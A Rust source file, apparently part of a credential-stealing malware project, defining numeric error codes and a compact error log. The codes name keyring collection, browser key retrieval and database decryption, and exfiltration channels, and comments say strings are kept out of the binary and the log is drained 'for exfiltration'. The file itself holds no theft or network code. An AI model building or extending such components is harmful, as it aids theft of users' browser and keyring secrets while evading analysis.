use std::sync::Mutex;

/// Error codes only. No descriptive strings in the binary.
/// Map maintained in documentation only.
pub mod codes {
    // Config 0-15
    pub const BOOTSTRAP_FAIL: u8 = 0x00;
    pub const CONFIG_READ: u8 = 0x01;
    pub const CONFIG_PARSE: u8 = 0x02;
    pub const CONFIG_KEY: u8 = 0x03;

    // Crypto 16-31
    pub const INVALID_PUBKEY: u8 = 0x10;
    pub const ENCRYPT_FAIL: u8 = 0x11;
    pub const DECRYPT_FAIL: u8 = 0x12;
    pub const SHORT_CIPHERTEXT: u8 = 0x13;
    pub const KEY_DERIVATION: u8 = 0x14;

    // Proto 32-47
    pub const SERIALIZE_FAIL: u8 = 0x20;
    pub const INVALID_ENVELOPE: u8 = 0x21;

    // Identity 48-63
    pub const IDENTITY_FAIL: u8 = 0x30;

    // Collection 64-79
    pub const COLLECT_FAILED: u8 = 0x40;
    pub const COLLECT_NOT_AVAIL: u8 = 0x41;
    pub const COLLECT_NO_KEYRING: u8 = 0x42;
    pub const COLLECT_KEYRING_FAILED: u8 = 0x43;

    // Browser 80-95
    pub const BROWSER_KEY_RETRIEVAL: u8 = 0x50;
    pub const BROWSER_DECRYPT_FAIL: u8 = 0x51;
    pub const BROWSER_DB_NOT_FOUND: u8 = 0x52;
    pub const BROWSER_QUERY_FAIL: u8 = 0x53;
    pub const BROWSER_PARSE_FAIL: u8 = 0x54;

    // Channel 224-239
    pub const SEND_FAIL: u8 = 0xe0;
    pub const NO_ENDPOINTS: u8 = 0xe1;
    pub const RESOLVE_FAIL: u8 = 0xe2;
    pub const CONNECT_FAIL: u8 = 0xe3;

    // General 240-255
    pub const FATAL: u8 = 0xFF;
}

static LOG: Mutex<Vec<(u64, u8)>> = Mutex::new(Vec::new());

/// Record an error as timestamp + code only
pub fn record(code: u8) {
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    if let Ok(mut log) = LOG.lock() {
        if log.len() < 256 {
            log.push((ts, code));
        }
    }
}

/// Drain the error log for exfiltration
pub fn drain() -> Vec<(u64, u8)> {
    if let Ok(mut log) = LOG.lock() {
        std::mem::take(&mut *log)
    } else {
        Vec::new()
    }
}

/// Serialize the error log as compact bytes.
/// Format: [count:u16][ts:u64 code:u8][ts:u64 code:u8]...
pub fn serialize() -> Vec<u8> {
    let entries = drain();
    let mut buf = Vec::with_capacity(2 + entries.len() * 9);
    buf.extend_from_slice(&(entries.len() as u16).to_le_bytes());
    for (ts, code) in entries {
        buf.extend_from_slice(&ts.to_le_bytes());
        buf.push(code);
    }
    buf
}